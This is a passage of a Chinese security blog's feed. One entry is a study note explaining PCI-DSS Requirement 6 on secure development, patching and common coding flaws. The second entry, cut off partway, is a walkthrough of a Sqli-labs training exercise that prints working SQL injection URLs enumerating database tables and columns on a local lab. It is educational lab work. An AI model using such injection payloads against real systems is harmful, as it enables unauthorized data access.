    <link href="http://rliyuqing.github.io/2019/04/15/19.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/19. PCI-DSS(V3.2.1)学习笔记(六)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:19.147Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-六"><a href="#PCI-DSS-V3-2-学习笔记-六" class="headerlink" title="PCI-DSS(V3.2)学习笔记(六)"></a>PCI-DSS(V3.2)学习笔记(六)</h1><hr><h1 id="三、维护漏洞管理计划"><a href="#三、维护漏洞管理计划" class="headerlink" title="三、维护漏洞管理计划"></a>三、维护漏洞管理计划</h1><h2 id="要求6-：开发并维护安全的系统和应用程序"><a href="#要求6-：开发并维护安全的系统和应用程序" class="headerlink" title="要求6 ：开发并维护安全的系统和应用程序"></a>要求6 ：开发并维护安全的系统和应用程序</h2><p>windows的各种升级以及补丁大家肯定很熟悉了，为了防止各种漏洞的攻击微软经常要求我们更新，给系统打补丁。在我们的企业中，攻击者经常会使用我们的系统或者应用程序出现的漏洞进行攻击，所以我们要对我们的系统和应用程序进行实时的关注和维护，在漏洞被发现的时候第一时间响应。</p><h3 id="6-1-制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）"><a href="#6-1-制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）" class="headerlink" title="6.1 制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）"></a>6.1 制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-53027f8ecda7c971.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.1"><br>对于我们正在使用的系统或者应用程序我们必须时刻关注和他相关的漏洞的出现。我们得有一定的信息收集渠道在漏洞出现的第一时间获取，并响应。比如CVE，国内的CNNVD或者国内一些著名的安全公司。<br>我们在第一时间获取这个漏洞情况的时候，第三方或者通报方肯定会有自己的风险等级分析的方案并给出漏洞的风险等级。我们详细了解这个漏洞之后，根据自己公司的情况以及公司自己的风险等级分析方案给出这个漏洞对于自己公司的风险等级，然后根据风险等级进行处理。<br>我们不是一次性就能扫描出所有的漏洞的，这个需要持续化的跟进，维护我们系统或应用程序的安全。<br>同时在处理漏洞的时候应该根据不同的风险等级有不用的优先级。对于被视为没有影响或者风险等级很低的漏洞，我们可能忽略，没有采取措施，但是一定要有记录，并持续对他进行风险分析，保证业务或者其他变动导致漏洞风险等级变高带来的威胁可以被及时发现。</p><h3 id="6-2-通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁"><a href="#6-2-通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁" class="headerlink" title="6.2 通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁"></a>6.2 通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bd0b0ea42851213f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-fa3209bc286b4f80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.2-2"><br>在出现新的漏洞的时候我们及时安装供应商提供的补丁。可能因为打补丁会对业务或者其他产生不必要的损失，但是我们必须协调好，在一定的时间内安装好供应商提供的补丁。比如这里说的一个月内安装关键补丁。在没有安装的这段时间内也要有相应的应对攻击的策略，减少漏洞给我们带来的损失。</p><h3 id="6-3-遵照如下要求安全地开发内部和外部软件应用程序"><a href="#6-3-遵照如下要求安全地开发内部和外部软件应用程序" class="headerlink" title="6.3 遵照如下要求安全地开发内部和外部软件应用程序"></a>6.3 遵照如下要求安全地开发内部和外部软件应用程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7ea1ef3133b88eb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3"><br>包括基于WEB的应用程序管理访问：<br>1、按照PCI DSS（例如安全验证和记录）<br>2、基于行业标准或最优方法<br>3、信息安全并入整个软件开发生命周期<br>这里从开发的角度直接从源头上尽量杜绝漏洞的产生。开发安全的系统或者应用程序，就得有安全的开发标准，代码标准等。<br>我们需要制定安全开发的标准，在软件或者应用程序的整个开发周期考虑到漏洞的可能产生。比如php安全开发手册，我们公司可能会有自己的标准，或者按照行业的标准或者按照PCI DSS的标准等。</p><h4 id="6-3-1-为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码"><a href="#6-3-1-为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码" class="headerlink" title="6.3.1 为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码"></a>6.3.1 为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0d5fbeec5dea259b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a241f2b4950bac80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3.1-2"><br>在安全开发的过程中我们可能是有了已经通过安全编码审核的框架（或者之前已经经过审核的代码），但是这里面根据不同的环境不同的需求我们会将代码进行更改，这部分就属于自定义代码片段。<br>对于自定义代码片段，虽然我们的开发人员按照安全的编码标准去开发，但是难免也会有漏洞，所以在代码项目发布或者交给客户之前我们需要对其进行代码审计，白盒测试。需要在除项目开发人员以外的有安全代码审计经验的开发人员进行代码审计，并修正。<br>我们在项目投入使用之后发现了编码漏洞这个时候要修复付出的代价是很大的，所以一定要有上线前的代码审计，最好也可以在测试环境上线并进行其他测试，比如黑盒测试。</p><h3 id="6-4-系统组件的所有变更均须遵守变更控制流程和程序。"><a href="#6-4-系统组件的所有变更均须遵守变更控制流程和程序。" class="headerlink" title="6.4 系统组件的所有变更均须遵守变更控制流程和程序。"></a>6.4 系统组件的所有变更均须遵守变更控制流程和程序。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-38bf260562727f07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4"><br>该流程必须包括如下内容（6.4.1-6.4.6）。<br>对于系统组件的操作和更改我们必须有规定的流程和程序，并严格执行。我们对系统组件的变更也要有一定的控制和记录，防止系统组件变更带来的安全隐患。第一眼看着这个要求，可能是翻译也可能是自己的学识不够所以不是很理解，所以我们先简单的理解一下字面上的意思，我们详细的看看6.4里面的具体流程都有哪些要求。</p><h4 id="6-4-1-开发-测试环境独立于生产环境，并借助访问控制确保两者分离"><a href="#6-4-1-开发-测试环境独立于生产环境，并借助访问控制确保两者分离" class="headerlink" title="6.4.1 开发/测试环境独立于生产环境，并借助访问控制确保两者分离"></a>6.4.1 开发/测试环境独立于生产环境，并借助访问控制确保两者分离</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7683ea05f0933367.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>测试环境和线上环境的分离是十分重要的，直接将线上环境当测试环境那如果一个不小心的操作很可能带来巨大的经济损失。这让我想起了前几个礼拜很多ofo用户都收到几个test消息，一看就是开发人员在线上进行测试了，所幸没有带来其他的影响。<br>对于测试环境我们也要通过访问控制将他与线上环境进行分离，因为我们的测试环境不断地变更，产生漏洞的可能性是很大的，如果没有将他和线上环境进行隔离的话，可能测试环境的漏洞直接给线上环境带来严重的威胁。</p><h4 id="6-4-2-开发-测试环境与生产环境中的职责分离"><a href="#6-4-2-开发-测试环境与生产环境中的职责分离" class="headerlink" title="6.4.2 开发/测试环境与生产环境中的职责分离"></a>6.4.2 开发/测试环境与生产环境中的职责分离</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-445fd2da5d87515e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.2"><br>这个其实让我联想到了最小权限的原则，对于不同的用户和场景我们只授予必要的权限，其他权限都默认禁止。对于测试环境和生产（线上）环境的职责和权限要分离。<br>比如开发者在测试环境可以有超管的权限，但是在生产环境就不一定，有可能只有用户最低的权限。对生产环境只有管理线上的工作人员才有权限。如果ofo对开发和测试人员进行职责的分离，就不会出现之前提到的情况了，开发或测试人员就不会有在线上环境直接测试的权限了。</p><h4 id="6-4-3-在测试或开发过程中不使用生产数据（真实的PAN）"><a href="#6-4-3-在测试或开发过程中不使用生产数据（真实的PAN）" class="headerlink" title="6.4.3 在测试或开发过程中不使用生产数据（真实的PAN）"></a>6.4.3 在测试或开发过程中不使用生产数据（真实的PAN）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c55c7503a88e57fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.3"><br>我们在测试环境测试一个系统或者应用程序的时候和实际线上环境还是有差别的，因为我们没有线上实际的用户数据，所有为了完整的安全测试或其他测试来说我们可能需要自己生成这样的数据。<br>一定确保在测试环境不用使用生产环境中用户或者其他的真实数据（比如用户身份信息或者管理员账号密码等），我们的测试样本必须是自己生成的。因为开发测试的环境是经常变动且不安全的，存在很多安全隐患可能会造成数据的泄露。</p><h4 id="6-4-4-在机会系统-系统投入生产之前、删除系统组件中的测试数据和账号"><a href="#6-4-4-在机会系统-系统投入生产之前、删除系统组件中的测试数据和账号" class="headerlink" title="6.4.4 在机会系统/系统投入生产之前、删除系统组件中的测试数据和账号"></a>6.4.4 在机会系统/系统投入生产之前、删除系统组件中的测试数据和账号</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-aac673ecfe1a9866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.4"><br>在测试环境经过一系列测试之后我们的系统或者应用程序即将发布，但是因为我们测试系统时使用了很多我们自己编造的数据或者测试的账号，在系统投入使用之前，我们需要将这些我们留下的测试痕迹清除，防止攻击者利用我们留下的数据进行攻击。<br>我们在测试环境测试的时候肯定会图方便，留下一些不安全的隐患，比如弱密码的test测试账号等，如果没有清除这些测试数据和账号，攻击者可能就会利用这些来了解我们的系统，发起攻击。</p><h4 id="6-4-5-变更控制程序包含（6-4-5-1-6-4-5-4）"><a href="#6-4-5-变更控制程序包含（6-4-5-1-6-4-5-4）" class="headerlink" title="6.4.5 变更控制程序包含（6.4.5.1-6.4.5.4）"></a>6.4.5 变更控制程序包含（6.4.5.1-6.4.5.4）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9238a4db5048bbc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5"><br>对于软件或者系统的变更我们必须要有一个控制他的程序，方案。因为我们软件在更新或者打补丁的时候可能会对整个环境产生影响，或者产生一些很玄学的影响，所以我们在软件变更的时候一定要有一个控制的方案，程序来控制和处理这个变更带来的影响。具体这个变更控制程序的基本要求我们看一下6.4.5.1-6.4.5.4</p><h5 id="6-4-5-1-影响记录"><a href="#6-4-5-1-影响记录" class="headerlink" title="6.4.5.1 影响记录"></a>6.4.5.1 影响记录</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-781aa55e419d81a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.1"><br>对于每次软件变更带来的影响我们都需要进行记录，这样可以为下一次的变更有一个参照，更好的分析变更产生影响的原因，更好的制定对变更之后影响的解决方案。</p><h5 id="6-4-5-2-被授权方的变更审批记录"><a href="#6-4-5-2-被授权方的变更审批记录" class="headerlink" title="6.4.5.2 被授权方的变更审批记录"></a>6.4.5.2 被授权方的变更审批记录</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a5e808d672ffbe83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.2"><br>我们进行测试变更时，需要保证这个测试的样本的变更是被授权的。比如说测试给一个软件打补丁的影响的时候，我们需要确认这个补丁是供应方官方发布的，并且这个补丁在供应方以及有通过审核的详细记录了，我们才能进行安装补丁的带来的影响的测试。</p><h5 id="6-4-5-3-功能测试，以确认该变更未对系统安全性造成不利影响"><a href="#6-4-5-3-功能测试，以确认该变更未对系统安全性造成不利影响" class="headerlink" title="6.4.5.3 功能测试，以确认该变更未对系统安全性造成不利影响"></a>6.4.5.3 功能测试，以确认该变更未对系统安全性造成不利影响</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8db4e2a02c0753d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.3"><br>在对一个系统进行变更，比如升级之后，我们需要进行功能测试，就是对系统的各功能进行测试，确保系统变更之后还在我们的安全体系保障之内，不会产生新的安全问题。<br>通过全面的测试我们要确认在变更之后这个系统仍让受我们安全策略的保护。</p><h5 id="6-4-5-4-取消程序"><a href="#6-4-5-4-取消程序" class="headerlink" title="6.4.5.4 取消程序"></a>6.4.5.4 取消程序</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f4e123c480853f3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.4"><br>就算我们提前经过变更测试，并记录了测试带来的影响。但是在实际的变更过程中还是有可能会有其他影响发生的，所以我们一定要确保这个变更有取消的程序，我们可以降级或者卸载补丁恢复到之前的环境。<br>环境问题有时候还是很玄学的，取消程序也是必不可少的挽回损失的关键一步。</p><h4 id="6-4-6-完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI-DSS要求，并在适当情况下更新文档记录"><a href="#6-4-6-完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI-DSS要求，并在适当情况下更新文档记录" class="headerlink" title="6.4.6 完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI DSS要求，并在适当情况下更新文档记录"></a>6.4.6 完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI DSS要求，并在适当情况下更新文档记录</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7f512550431ce970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.6"><br>我们前面说到要保证变更之后系统或应用程序仍在我们的安全策略保护之内，这里同时要求我们变更后，受变更影响的系统或者网络我们必须重新验证，并保证其仍然符合PCI DSS的要求。<br>比如重置新系统的默认密码，删除新系统的默认账号，以及新的网络图等等。这是很关键的要求，这样才能保证我们所有的重要系统或者网络在PCI DSS的要求内，不会出现重要的系统或网络没有受到安全保护。<br>这就相当于写了一个死循环，开始是我在PCI DSS的标准内，因为系统或者程序的变更，发生了变化，在继续按照PCI DSS的标准重新规范我们的新系统。这样就保证我们的系统或网络始终在PCI DSS的标准范围内。</p><h3 id="6-5-按照以下方式处理软件流程中常见的编码漏洞"><a href="#6-5-按照以下方式处理软件流程中常见的编码漏洞" class="headerlink" title="6.5 按照以下方式处理软件流程中常见的编码漏洞"></a>6.5 按照以下方式处理软件流程中常见的编码漏洞</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-5d154e8613687097.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-7cb6076895ef1a55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5-2"><br>方式：<br>1、至少每年对开发人员进行一次最新安全编码技术方面的培训，包括如何避免常见的编码漏洞<br>2、根据安全编码指南开发应用程序<br>上面都说了在开发过程中清理排除编码漏洞，但是总会有漏网之鱼，我们也要有万全之策，如果出现了编码漏洞我们也得有应对策略。<br>我们要有适当的流程保证开发过程中避免编码漏洞的产生（定期安全编码培训，安全编码指南），以及漏洞产生之后的应对措施。对于编码漏洞我们尽力做到最好，如果有不足的地方我们也要有弥补的方法，这里的6.5.1-6.5.10是我们至少要能应对的编码漏洞，都是一些著名的高危漏洞。</p><h4 id="6-5-1-注入攻击"><a href="#6-5-1-注入攻击" class="headerlink" title="6.5.1 注入攻击"></a>6.5.1 注入攻击</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0adcffbe269327be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.1"><br>特别是SQL注入，同时还需考虑OS命令注入、LDAP、Xpath等其他注入攻击。<br>我们关注OWASP  top ten就会发现历年来，注入蝉联榜首已经很多年了，灰产内利用注入批量攻击的工具更是数不胜数。由此可见注入带来的危害有多大，范围有多广；我们安全开发人员也得有多重视。<br>有过经验的安全从业者都知道，数据与代码分离的原则是解决注入漏洞的关键。所有的注入类型的漏洞都是因为服务器将用户输入的数据当成代码执行了，混淆了数据和代码的边界。<br>对于用户的输入我们都认为是数据，杜绝他变成代码并执行时解决注入问题的关键。所以要合理处理，验证用户的输入，确保其不会变成代码执行。或者利用参数化查询。<br>同时我们也要确保输入的验证不会影响用户的体验，要合理的处理用户的输入数据。</p><h4 id="6-5-2-缓冲区溢出"><a href="#6-5-2-缓冲区溢出" class="headerlink" title="6.5.2 缓冲区溢出"></a>6.5.2 缓冲区溢出</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-107901fdcf1908a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.2"><br>其实缓冲区溢出和注入的原理差不多，都是因为服务器将数据当做代码来执行了。程序在栈或者堆中，将用户数据当做代码执行，混淆了数据和代码的边界。<br>对于缓冲区溢出的问题，我们可以通过验证缓冲区边界，截取输入字符串来解决。<br>简单的说在进程地址中有数据段和代码段，因为数据段受空间大小的限制，当我们输入的数据超过这个数据段的空间时，数据就会被挤到下面的代码段，并当成代码执行。<br>详细的缓冲区溢出可以上网看看各种原理分析。</p><h4 id="6-5-4-非安全加密存储"><a href="#6-5-4-非安全加密存储" class="headerlink" title="6.5.4 非安全加密存储"></a>6.5.4 非安全加密存储</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b2c142188b41dbdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.3"><br>使用了容易破解的加密方法加密存储数据或者甚至没有加密就存储数据，攻击者就很容易便可以得到数据的明文。<br>我们可以使用强效的加密算法加密我们数据或者很多其他强效的加密手段。</p><h4 id="6-5-4-非安全通信"><a href="#6-5-4-非安全通信" class="headerlink" title="6.5.4 非安全通信"></a>6.5.4 非安全通信</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-04834e401994b570.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.4"><br>同样，我们使用费非安全信道进行通信也是极其危险的，对于非安全的通信我们得有加密的手段来保证其是安全的。比如使用https等。</p><h4 id="6-5-5-不正确的错误处理"><a href="#6-5-5-不正确的错误处理" class="headerlink" title="6.5.5  不正确的错误处理"></a>6.5.5  不正确的错误处理</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-804f66e7733a7309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.5"><br>这一点很多公司的安全上都没有注意到。我感觉注意是两个方面，一个是对于代码上的错误没有进行正确的处理导致敏感信息泄露，比如我们访问一些网站的错误请求时会有报错提示，这里可能会泄露网站的物理路径等信息。<br>第二个就是业务方面了，比如用户登录的时候，对于错误的登录请求时，服务器对密码错误和用户名错误进行了自以为贴心的区别处理，用户名存在，密码错误就提示：“密码错误”，用户名和密码都不对就提示：“用户名错误”，虽然提高了一些用户体验，但是带来的更多还是安全隐患。攻击者可以根据这不同的提示爆破用户的密码。</p><h4 id="6-5-6-漏洞识别流程中确认的所有“高风险”漏洞"><a href="#6-5-6-漏洞识别流程中确认的所有“高风险”漏洞" class="headerlink" title="6.5.6 漏洞识别流程中确认的所有“高风险”漏洞"></a>6.5.6 漏洞识别流程中确认的所有“高风险”漏洞</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-42eab9b4322a6ed3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.6"><br>还有很多其他的漏洞，有一些可能其他方威胁分析为低的对于我们所处的公司实际为高风险，所以我们在前面说过公司要自己根据不同情况分析漏洞的风险等级，然后进行处理。我们对这“高风险”的漏洞也要有应对的措施。确保发现这样的漏洞后能及时相应，最大化减少损失。</p><h4 id="6-5-7-跨站脚本"><a href="#6-5-7-跨站脚本" class="headerlink" title="6.5.7 跨站脚本"></a>6.5.7 跨站脚本</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-010e638c48b00a3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.7"><br>6.5.1到6.5.6都是适用所有的应用程序来说，6.5.7到6.5.10则是适用于网络应用程序和应用程序的接口。<br>XSS就是利用“HTML注入”的方式，给网页嵌入了恶意脚本，从而在用户浏览网页的时候，执行恶意脚本进行攻击。<br>但是其实XSS的场景很复杂，很难解决，场景不同我们的处理方式也不同。这里说道对参数在应用前进行验证，是否合法以及利用上下文相关的转义。<br>涉及到用户输入的数据被当做代码执行的情况，都是混淆的数据和代码的边界，最重要的方法就是输入的检测。</p><h4 id="6-5-8-不正确的访问控制"><a href="#6-5-8-不正确的访问控制" class="headerlink" title="6.5.8 不正确的访问控制"></a>6.5.8 不正确的访问控制</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d336bb3f467a7502.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.8"><br>例如不安全的直接对象引用、未能限制网址访问、目录遍历和未能限制用户的功能访问。<br>损坏的访问控制在OWASP 2017中排在了第五的位置，甚至超过了第七的XSS。<br>不正确的访问控制十分的危险，没有一个完善的访问控制机制，攻击者可以轻松的伪造成某些用户进行访问。或者其他的访问控制缺失，导致url上显示了具体的文件名，导致用户可以未授权的更改文件名进行访问。<br>这里包括很多情况，但是最主要的就是访问控制机制的不完善，导致攻击者可以在未授权的情况访问不该被访问的敏感内容（如数据，文件等）。博主校园网内部的财务系统就曾出现了类似的的问题，因为使用的是校园统一认证，用学生的身份经过统一认证之后，跳转的时候更改访问的id就可以用不同的学生或教师身份登录。这就是典型的访问控制机制的缺失，不完善。<br>我们要根据具体出现的情况进行漏洞的修复，比如这里提到的正确的验证用户的身份，确保不会被伪造，以及对未授权的功能不允许用户访问，还有不想用户暴力内部对象引用也很重要，攻击者就更难构造这样的伪造访问。</p><h4 id="6-5-9-跨站请求伪造（CSRF）"><a href="#6-5-9-跨站请求伪造（CSRF）" class="headerlink" title="6.5.9 跨站请求伪造（CSRF）"></a>6.5.9 跨站请求伪造（CSRF）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1b5b034e83150c8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.9"><br>跨站请求伪造也是典型的高危漏洞之一。简而言之就是攻击者盗用用户的身份并发送恶意请求。我们窃取了用户的会话令牌，也就是到浏览器的Cookies。比如说我们诱使目标访问淘宝，使他淘宝用户的session cookies有效，然后实施csrf，让他访问一个购买商品的链接或者其他我们想要的动作对应的链接。<br>这就是因为我们会话管理和验证失效了，应对措施这里有不暴露会话id以及添加超时和轮换id等等。还有一些比如验证码手段，强制用户和应用进行交互才能完成请求。</p><h3 id="6-6-对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击"><a href="#6-6-对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击" class="headerlink" title="6.6 对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击"></a>6.6 对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b38cd81bf796a59e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.6"><br>1、利用手动或自动应用程序漏洞安全评估工具或方法审核面向公众网络应用程序，至少每年一次并在有任何变更后进行<br>2、在面向公众的web应用程序前安装可检查和防范网页式攻击的自动化技术解决方案（例如web应用程序防火墙），泳衣不断检查所有流量<br>说一句，企业的src还是挺有必要的。对于面向公众的网络应用，就是对外提供服务的那些网络应用，我们要持续不断地解决新的威胁和漏洞。既然对外开放，就会面临不断地攻击，我们要通过一定的手段，确保他不受这些攻击的威胁。我们可以通过上面说的两个方法。<br>一个是定期手动或者自动对这个网络应用进行漏洞安全评估。我们需要定期执行，但是在某些情况发生导致系统环境产生变化我们也都进行检测评估，并在发现漏洞后及时修复，记录并重新评估。<br>二是在这个网络应用和外部网络之间增加加一个防止攻击的自动化解决方案，比如web防火墙，安全狗之类的。在使用之后我们也得确保我们的防火墙处于工作状态以及有详细的抵御攻击的日志。</p><h3 id="6-7-确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序"><a href="#6-7-确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序" class="headerlink" title="6.7 确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序"></a>6.7 确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-24ed308b23819cae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.7"><br>确保我们开发并维护安全的系统和应用程序的措施被详细记录，并且相关人员以及学习并严格遵守。落实到每个人。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第三个区域维护漏洞管理计划也就结束了。回头看看，主要就是有实时更新的杀毒软件和开发并维护安全的系统和网络应用程序流程。这个区域主要就是对漏洞产生时候我们最快修补漏洞，最大化减少漏洞对我们产生的不利影响。我们虽然可以尽全力把防御体系做到最好，但是不可能杜绝漏洞的而产生，所有做好对漏洞的及时响应也是企业安全中的一个重要环节。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-六&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-六&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(六)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(六)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs实验Task4（less54-65）</title>
    <link href="http://rliyuqing.github.io/2019/04/15/9.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask4%EF%BC%88less54-65%EF%BC%89/"/>
    <id>http://rliyuqing.github.io/2019/04/15/9. Sqli-lab实验Task4（less54-65）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:49:06.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p><p>知道数据库名是challenges，下面获取表名：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a6241fcbf6640597.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>获取了表名，果然是随机产生的，现在获取字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,column_name from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-06ae708b48b40d3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>可以看到第一个字段是id，还是直接获取所有列名把，有点蠢，以为一次就能出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- 